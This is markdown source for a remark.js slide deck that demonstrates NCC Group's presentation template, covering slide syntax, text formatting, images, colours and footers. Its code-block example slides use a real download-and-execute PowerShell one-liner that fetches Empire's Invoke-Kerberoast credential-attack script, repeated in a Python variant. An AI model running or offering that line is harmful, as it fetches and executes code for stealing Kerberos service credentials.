class: layout-cover-corp

# Demo Slides

## Subtitle

---

# What Is This?

This presentation is written enitrely in markdown, it's designed to demonstrate some the features of the `modular-2019` template.

For example the previous slide in markdown was

```remark
class: layout-cover-corp

# Demo Slides

## Subtitle
```

The markdown is rendered with the tool [remark](https://github.com/gnab/remark) into a slideshow that can be run from a web browser. It has the similar functionality to Powerpoint, press `h` to bring up all the keyboard shortcuts. A lot of the basics are detailed in the [remark wiki](https://github.com/gnab/remark/wiki/Markdown). The NCC template extends its capabilities.

???

* test bullet points
* some more

---

# Creating a Table of Contents

The following slide uses a special `@toc` keyword that will be converted automatically
while building the slides and replaced with text and links to any slides in the presentation decorated with `@section Name`.

Example:

```remark
---
# Agenda

`@toc`

---
`@section` Introduction

# Introduction

Some Text Here
```

**Note: Don't include the backticks around `@toc` or `@section`, they're included here to let you see the code.**

---

# Agenda

@toc

---
@section General Concepts
class: layout-cover-connection

# General Concepts

## Slides, Headings and Content

---

# Slides

The markdown format for creating slides is very similar to the flavour used across common implementations such as Github.

There are several key markdown elements which have a different behaviour in Remark.js, the most importatant one is the slide separator. Slides are separated with three dashes: `---`.

Slide notes are separated with three question marks: `???`.

---

# Slide Headings

## and Subheadings

Most slides with have a heading, this is set using the standard markdown notation with a single hash: `# Heading 1`.

Slides can also have a subheading which is set with the standard markdown notation of two hashes: `## Heading 2`.

The location and format of the headings depend on the slide layout in use, there are examples in this presentation.

---

# Slide Headings - Code

```remark
---

# Slide Headings

## and Subheadings

Most slides with have a heading, this is set using the standard markdown notation with a single hash: `# Heading 1`.

Slides can also have a subheading which is set with the standard markdown notation of two hashes: `## Heading 2`.

The location and format of the headings depend on the slide layout in use, there are examples in this presentation.

---
```

---

# Incremental Slides

Incremental slides are created by separating content with `--` instead of `---`.

* This is the first bullet

--

* This is the second one
* Third one

--

* ..and fourth one

---

# Incremental Slides - Code

```code-plain
---

# Incremental Slides

* This is the first paragraph

--

* This is the second one
* Third one

--

* ..and fourth one

---
```

---
 # Slide Decorators

 A number of decorators can be added to a slide to change its behaviour, they are typically added as the first thing on a slide after the slide separator (`---`).

Examples:

```remark
---
class: class-name1 class-name2 <- is used to define layouts, color schemes and other whole-slide effects

background-image: url(img/my_background.png) <- is used to set a custom slide background image

layout: true <- is used to specify this as a layout slide for the following slides (useful for setting the color scheme)

---
```

---
@section Text Formatting
class: layout-cover-connection

# Text Formatting

## Styles, Bullets, numbering, text colors and more

---

# Text Examples

# Heading 1

## Heading 2

### Heading 3

#### Heading 4

normal text

_italic text_

__bold text__

___bold italic text___

---

# Text Example - Code

```remark
---

# Text Examples

# Heading 1

## Heading 2

### Heading 3

#### Heading 4

normal text

_italic text_

__bold text__

___bold italic text___

---
```

---

# Custom Text Examples

.font-size-32[Custom font size]

.font-size-30[.text-colour-green[Smaller custom font size in green]]

.font-size-28[~~Strikethrough with smaller custom font size~~]


The examples above are produce with the following code:

```code-plain
.font-size-32[Custom font size]

.font-size-30[.text-colour-green[Smaller custom font size in green]]

.font-size-28[~~Strikethrough with smaller custom font size~~]
```

---
class: center middle

# Centered Text

Text centered both horizontally and vertically

Using the `class: center middle` tag on the slide

```remark
class: center middle

# Centered Text

Text centered both horizontally and vertically
```

.center[.middle[or the `center` and `middle` classes]]

```remark
.center[.middle[or the `center` and `middle` classes]]
```

---

class: center

# Black Team vs _3 Day Wonder_ (Example of centered text)

<br>

## 12 days .text-colour-red[vs] 3 days

## 8 phases .text-colour-red[vs] 3 phases

## Strategic planned .text-colour-red[vs] Rushed & opportunistic

## Team based .text-colour-red[vs] Solo consultant

## Assessment .text-colour-red[vs] "we breached, we are cool" - Z team

## Consultant & client safety .text-colour-red[vs] Danger zone

.footnote[Source: https://web.microsoftstream.com/video/d7017bf8-fd4a-49f9-9161-3d312f16798f]

???

Example of centered text

---

# Centered Text Example - Code

```remark
class: center

# Black Team vs _3 Day Wonder_ (Example of centered text)

<br>

## 12 days .text-colour-red[vs] 3 days

## 8 phases .text-colour-red[vs] 3 phases

## Strategic planned .text-colour-red[vs] Rushed & opportunistic

## Team based .text-colour-red[vs] Solo consultant

## Assessment .text-colour-red[vs] "we breached, we are cool" - Z team

## Consultant & client safety .text-colour-red[vs] Danger zone

.footnote[Source: https://web.microsoftstream.com/video/d7017bf8-fd4a-49f9-9161-3d312f16798f]
```

---

# Bullet Points Demo

* Bullet point level 1
  * Bullet point level 2
    * Bullet point level 3
      * Bullet point 4
  * Bullet point level 2

---

# Bullet Points Demo - Code

```code-plain
---
# Bullet Points Demo

* Bullet point level 1
  * Bullet point level 2
    * Bullet point level 3
      * Bullet point 4
  * Bullet point level 2

---
```

---

# Numbered Points Demo

1. Numbered point level 1
   1. Numbered point level 2
      1. Numbered point level 3
         1. Numbered point 4
   1. Numbered point level 2

---

# Numbered Points Demo - Code

```remark
---

# Numbered Points Demo

1. Numbered point level 1
   1. Numbered point level 2
      1. Numbered point level 3
         1. Numbered point 4
   1. Numbered point level 2

---
```

---

# Bullet And Numbered Points Demo

* Bullet point level 1
  1. Numbered point level 2
     * Bullet point level 3
       * Bullet point 4
  1. Numbered point level 2

---

# Bullet and Numbered Points Demo - Code

```code-plain
---

# Bullet And Numbered Points Demo

* Bullet point level 1
  1. Numbered point level 2
     * Bullet point level 3
       * Bullet point 4
  1. Numbered point level 2

---
```

---

# Incremental Slides on One Line & Text Colour Demo

* What port does __http__ run on?

--
.text-colour-green[TCP/80]
--

* What port does __tftp__ run on?

--
.text-colour-green[UDP/69]
--

* .text-colour-red[What is the location of the Active Directory database?]

--
`%SystemRoot%\NTDS\ntds.dit`

---

# Incremental Slides and One Line &amp; Text Color Demo - Code

<pre>
```
# Incremental Slides on One Line &amp; Text Colour Demo

* What port does __http__ run on?

--
.text-colour-green[TCP/80]
--

* What port does __tftp__ run on?

--
.text-colour-green[UDP/69]
--

* .text-colour-red[What is the location of the Active Directory database?]

--
`%SystemRoot%\NTDS\ntds.dit\`
```
</pre>

---

# Code Blocks

* Line with `inline code`
* Code block with default highlighting

    ```
    echo "Code block with default highlighting"
    ```

--

* Code block with PowerShell highlighting

    ```powershell
    <# Code block with powershell highlighting #>
    iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
    ```

--

* Code block with Python highlighting and custom font styles

    ```python
    .font-size-16[# This text is set to 16px size]
    import requests
    requests.get("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
    .text-colour-green[# This text is set to green (overriding the code highlighting)]
    ```

* Setting the code language to `code-plain` will prevent formatting by the NCC Template Scripts

.footnote[https://github.com/highlightjs/highlight.js#supported-languages]

---

# Code Blocks Example - Code

<pre>
  * Line with `inline code`
  * Code block with default highlighting
  
      ```
      echo "Code block with default highlighting"
      ```

  * Code block with PowerShell highlighting
  
      ```powershell
      &lt;# Code block with powershell highlighting #&gt;
      iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
      ```

  * Code block with Python highlighting and custom font styles
  
      ```python
      .font-size-16[# This text is set to 16px size]
      import requests
      requests.get("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
      .text-colour-green[# This text is set to green (overriding the code highlighting)]
      ```
</pre>

---

# Blockquotes

>Hack the planet - default blockquote style

.raspberry[
>Hack the planet - `raspberry` blockquote
]

.red[
>Hack the planet - `red` blockquote
]

.blue[
>Hack the planet - `blue` blockquote
]

---

# Blockquotes - Code

```remark
>Hack the planet - default blockquote style

.raspberry[
>Hack the planet - `raspberry` blockquote
]

.red[
>Hack the planet - `red` blockquote
]

.blue[
>Hack the planet - `blue` blockquote
]
```

---
@section Images
class: layout-cover-connection

# Images

## Placement and Borders

---

# What Is RFID?

.center[
![](img/visible_confusion.gif?width=750px)
]

.footnote[Source: https://web.microsoftstream.com/video/d7017bf8-fd4a-49f9-9161-3d312f16798f]

???

Example of image taking the default rendering (with or without border as defined in `config.js`)

---

# Default Image Rendering - Code

```remark
---

# What Is RFID?

.center[
![](img/visible_confusion.gif?width=750px)
]

.footnote[Source: https://web.microsoftstream.com/video/d7017bf8-fd4a-49f9-9161-3d312f16798f]

???

Example of image taking the default rendering (with or without border as defined in `config.js`)

---
```

---

class: img-no-border

# What Is RFID?

.center[
![](img/visible_confusion.gif?width=750px)
]

The class `img-no-border` has been added as a slide decorator to remove the image border.

???

Example of no border on all images

---

class: img-border

# What Is RFID?

.center[
![](img/visible_confusion.gif?width=750px)
]

The class `img-border` has been added as a slide decorator to force an image border.

???

Example of borders on all images

---

# Images - Borders and Resizing

.center[.img-no-border[
![](img/visible_confusion.gif?width=320px)
]]

.center[.img-border[
![](img/visible_confusion.gif?width=320px)
]]

* The `img-border` and `img-no-border` have been added to each image to force a/no border.
* Use `?width=size` at the end of an image URL to specify a custom width in px or %.

???

Example of border or no-border on each image

---

# Image Borders - Code

```code-plain
---

# What Is RFID?

.center[.img-no-border[
![](img/visible_confusion.gif?width=320px)
]]

.center[.img-border[
![](img/visible_confusion.gif?width=320px)
]]

* The `img-border` and `img-no-border` have been added to each image to force a/no border.
* Use `?width=size` at the end of an image URL to specify a custom width in px or %.

---
```

---

# Images - Recolour

* Wrapping the image in the `bw-image` class can make it Grayscale.

.center[.bw-img[![:img ,width: 100%](img/ncc_ninja_banner.png)]]

Code:

```code-plain
.center[.bw-img[![:img ,width: 100%](img/ncc_ninja_banner.png)]]
```

---

# Custom Image Macro

* The template includes an image macro which can be used to set explicit CSS properties on an image.
* The `img` macro takes two arguments
  * Alt Text
  * CSS String

Code:

```code-plain
![:img Alt Text, height: 100%; border: none](img/myimage.png)

#Alt text can be blank
![:img , height: 200px; opacity: 0.5;](img/myimage.png)
```
---

# Image Slide Example - Mifare Classic

.left-column[
.img-no-border[![](img/mifare_logo.png)]
]

.right-column[
.font-size-30[
* High Frequency
* Encryption in use (Crypto-1)
* Majority of data is NOT word readable
]
]

.footnote[Source: https://web.microsoftstream.com/video/d7017bf8-fd4a-49f9-9161-3d312f16798f]

???

Example of two column with no border image

---

# Mifare Classic - Code

```code-plain
# Mifare Classic

.left-column[
.img-no-border[![](img/mifare_logo.png)]
]

.right-column[
.font-size-30[
* High Frequency
* Encryption in use (Crypto-1)
* Majority of data is NOT word readable
]
]

.footnote[Source: https://web.microsoftstream.com/video/d7017bf8-fd4a-49f9-9161-3d312f16798f]
```

---
@section Color Schemes and Branding
class: layout-cover-connection

# Color Schemes and Branding

---

class: purple

# Colours

This template supports all of the NCC colours

* .text-colour-blue[blue]
* .text-colour-gold[gold]
* .text-colour-purple[purple]
* .text-colour-raspberry[raspberry]
* .text-colour-red[red]
* .text-colour-teal[teal]

Simply add the colour to the `class` at the top of the slide to change the header colour, for example in this slide it is

```remark
class: purple
```

To use the same color scheme througout a presentation, you can use a `layout` and `class` tag at the top of the presentation before the first slide (`---`) marker:

```remark
layout: true
color: purple
```

---
class: layout-two-columns
# Default Color Scheme

.left-column[
* Bullet point text

Some text

[A hyperlink](https://www.nccgroup.trust/)

_Italic text_

<u>underlined</u>

__bold__

<br/>

Text below newline
]

.right-column[
![](img/debugger_vs_printf.jpg?width=450px)
]

---
class: gold
# NCC Group Gold

* Bullet point text

Some text

[A hyperlink](https://www.nccgroup.trust/)

_Italic text_

<u>underlined</u>

__bold__

<br/>

Text below newline

---

class: gold
# NCC Group Gold - Two Column

.left-column[
* Bullet point text

Some text

[A hyperlink](https://www.nccgroup.trust/)

_Italic text_

<u>underlined</u>

__bold__

<br/>

Text below newline
]

.right-column[
![](img/debugger_vs_printf.jpg?width=450px)
]

---
class: raspberry
# NCC Group Raspberry

* Bullet point text

Some text

[A hyperlink](https://www.nccgroup.trust/)

_Italic text_

<u>underlined</u>

__bold__

<br/>

Text below newline

---
class: raspberry
# NCC Group Raspberry - Two Column

.left-column[
* Bullet point text

Some text

[A hyperlink](https://www.nccgroup.trust/)

_Italic text_

<u>underlined</u>

__bold__

<br/>

Text below newline
]

.right-column[
![](img/debugger_vs_printf.jpg?width=450px)
]

---
class: teal
# NCC Group Teal

* Bullet point text

Some text

[A hyperlink](https://www.nccgroup.trust/)

_Italic text_

<u>underlined</u>

__bold__

<br/>

Text below newline

---
class: teal
# NCC Group Teal - Two Column

.left-column[
* Bullet point text

Some text

[A hyperlink](https://www.nccgroup.trust/)

_Italic text_

<u>underlined</u>

__bold__

<br/>

Text below newline
]

.right-column[
![](img/debugger_vs_printf.jpg?width=450px)
]

---
class: blue
# NCC Group Blue

* Bullet point text

Some text

[A hyperlink](https://www.nccgroup.trust/)

_Italic text_

<u>underlined</u>

__bold__

<br/>

Text below newline

---
class: blue
# NCC Group Blue - Two Column

.left-column[
* Bullet point text

Some text

[A hyperlink](https://www.nccgroup.trust/)

_Italic text_

<u>underlined</u>

__bold__

<br/>

Text below newline
]

.right-column[
![](img/debugger_vs_printf.jpg?width=450px)
]

---
class: purple
# NCC Group Purple

* Bullet point text

Some text

[A hyperlink](https://www.nccgroup.trust/)

_Italic text_

<u>underlined</u>

__bold__

<br/>

Text below newline

---
class: purple
# NCC Group Purple - Two Column

.left-column[
* Bullet point text

Some text

[A hyperlink](https://www.nccgroup.trust/)

_Italic text_

<u>underlined</u>

__bold__

<br/>

Text below newline
]

.right-column[
![](img/debugger_vs_printf.jpg?width=450px)
]

---
class: red
# NCC Group Red

* Bullet point text

Some text

[A hyperlink](https://www.nccgroup.trust/)

_Italic text_

<u>underlined</u>

__bold__

<br/>

Text below newline

---
class: red
# NCC Group Red - Two Column

.left-column[
* Bullet point text

Some text

[A hyperlink](https://www.nccgroup.trust/)

_Italic text_

<u>underlined</u>

__bold__

<br/>

Text below newline
]

.right-column[
![](img/debugger_vs_printf.jpg?width=450px)
]

---
class: layout-content-bar-ncc
# NCC Group Footer

Default for most layouts, however you can always add the following class to the slide:

```
class: layout-content-bar-ncc
```

---

class: layout-content-bar-fox
# FoxIT Footer

Add the following class to the slide:

```
class: layout-content-bar-fox
```

---
class: layout-content-bar-fort

# FortConsult Footer

Add the following class to the slide:

```
class: layout-content-bar-fort
```

---
class: layout-plain

# Plain Footer

Add the following class to the slide:

```
class: layout-plain
```